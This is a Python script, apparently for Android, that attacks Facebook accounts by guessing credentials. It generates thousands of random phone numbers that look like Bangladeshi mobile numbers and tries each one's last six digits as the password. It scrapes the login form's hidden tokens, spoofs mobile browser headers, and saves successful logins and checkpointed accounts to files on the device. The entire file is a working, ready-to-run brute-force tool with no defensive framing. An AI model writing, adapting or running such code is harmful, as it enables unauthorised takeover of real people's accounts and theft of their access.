import requests
import random
import sys
import os
import re

os.system("clear")

for i in range(6000):
	code=["017","018","019"]
	code2=random.choice(code)
	final_code=str(code2)
	x=random.randint(11,99)
	xx=str(x)
	first_part=(final_code+xx)
	lest=random.randint(111111,999999)
	last_part=str(lest)
	num=(first_part+last_part)
	pwd=(last_part)
	

	session = requests.Session()
	free_fb = session.get('https://mbasic.facebook.com').text
	
	log_data = {
    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
   "try_number":"0",
   "unrecognized_tries":"0",
   "email":num,
   "pass":pwd,
   "login":"Log In"}
   
	header_freefb = {'authority': 'mbasic.facebook.com',
    "method": 'GET',
    "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5655.225", "Google Chrome";v="113.0.5655.225"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5655.225 Mobile Safari/537.36',
    'viewport-width': '980',}
    
	lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
	log_cookies=session.cookies.get_dict().keys()
	if "c_user" in log_cookies:
		print("[✓]"+num+"="+pwd)
		save=open("/sdcard/[OK].txt","a").write(num+"="+pwd+"\n")
	elif "checkpoint" in log_cookies:
		print("[×]"+num+"="+pwd)
		saver=open("/sdcard/[CP].txt","a").write(num+"="+pwd+"\n")
	else:
		print(f"[Tryining]-{[i]}")